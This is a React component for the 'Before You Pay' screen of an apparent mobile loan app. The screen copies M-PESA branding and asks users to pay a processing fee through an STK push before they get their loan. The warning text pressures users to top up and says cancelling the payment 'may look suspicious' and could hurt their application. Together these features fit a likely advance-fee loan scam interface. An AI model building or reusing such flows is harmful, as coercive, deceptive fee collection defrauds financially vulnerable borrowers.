'use client'

import React from 'react'
import { AlertTriangle, Wallet, ArrowRight, ArrowLeft } from 'lucide-react'
import { formatForDisplay } from '../../utils/phone'

interface PayWarningProps {
  userName?: string
  processingFee: number
  totalRepayment: number
  phoneNumber: string
  onConfirm: () => void
  onCancel: () => void
}

export default function PayWarning({ 
  userName, 
  processingFee, 
  totalRepayment, 
  phoneNumber, 
  onConfirm, 
  onCancel 
}: PayWarningProps) {
  const displayPhone = formatForDisplay(phoneNumber)

  return (
    <div className="min-h-screen bg-[#007b3e] flex items-center justify-center py-8 px-4 sm:px-6 lg:px-8 font-sans">
      <div className="max-w-xl w-full bg-white rounded-3xl shadow-2xl overflow-hidden border border-white/10">
        <div className="p-6 sm:p-8">
          {/* Header with M-PESA logo */}
          <div className="flex items-center gap-3 mb-6">
            <div className="flex items-center bg-[#3fb235] text-white px-2 py-0.5 rounded text-[11px] font-black tracking-tight select-none">
              <span className="text-[#e22127]">M</span>-PESA
            </div>
            <h1 className="text-2xl font-extrabold text-[#007b3e] tracking-tight">
              Before You Pay
            </h1>
          </div>

          {/* User Greeting */}
          <p className="text-[#4b5563] text-base mb-6 font-medium">
            Hi {userName || 'Customer'}, please read this carefully before continuing.
          </p>

          {/* Processing Fee Card */}
          <div className="bg-[#f4f9f4] rounded-2xl p-6 mb-6 text-center border border-[#e8f3e8]">
            <p className="text-xs text-[#718096] font-bold tracking-wider uppercase">
              Processing Fee
            </p>
            <p className="text-5xl font-black text-[#007b3e] my-3">
              KSh {processingFee.toLocaleString()}
            </p>
            <p className="text-sm text-[#4b5563] font-semibold">
              Total loan repayment: KSh {totalRepayment.toLocaleString()}
            </p>
          </div>

          {/* Warning Card */}
          <div className="border border-amber-200 bg-[#fffbeb] rounded-2xl p-5 mb-6 flex gap-3.5 items-start">
            <AlertTriangle className="w-5 h-5 text-amber-600 flex-shrink-0 mt-0.5" />
            <p className="text-sm text-amber-800 leading-relaxed font-medium">
              Make sure your M-PESA account has at least <span className="font-extrabold text-amber-950">KSh {processingFee}</span> before continuing. If you do not have enough funds, top up now. Cancelling the payment prompt may look suspicious and can affect your loan application.
            </p>
          </div>

          {/* Wallet Push Notification Card */}
          <div className="bg-[#f4f9f4] rounded-2xl p-5 mb-8 flex gap-3.5 items-start border border-[#e8f3e8]">
            <div className="p-1 bg-white rounded-lg border border-[#e8f3e8] text-[#007b3e] flex-shrink-0">
              <Wallet className="w-5 h-5" />
            </div>
            <p className="text-sm text-[#4b5563] leading-relaxed font-semibold">
              You will receive an M-PESA STK push on <span className="font-black text-gray-900">{displayPhone}</span>. Enter your PIN to complete the payment.
            </p>
          </div>

          {/* Action Buttons */}
          <div className="flex flex-col gap-4">
            <button
              onClick={onConfirm}
              className="w-full bg-[#007b3e] hover:bg-[#006231] text-white font-bold py-4 px-6 rounded-2xl text-lg flex items-center justify-center gap-2 transition duration-200 shadow-lg shadow-[#007b3e]/20"
            >
              Continue to Payment
              <ArrowRight className="w-5 h-5" />
            </button>

            <button 
              onClick={onCancel} 
              className="w-full text-center text-gray-500 hover:text-gray-800 text-sm font-semibold transition py-2 flex items-center justify-center gap-1.5"
            >
              <ArrowLeft className="w-4 h-4" />
              Go back
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
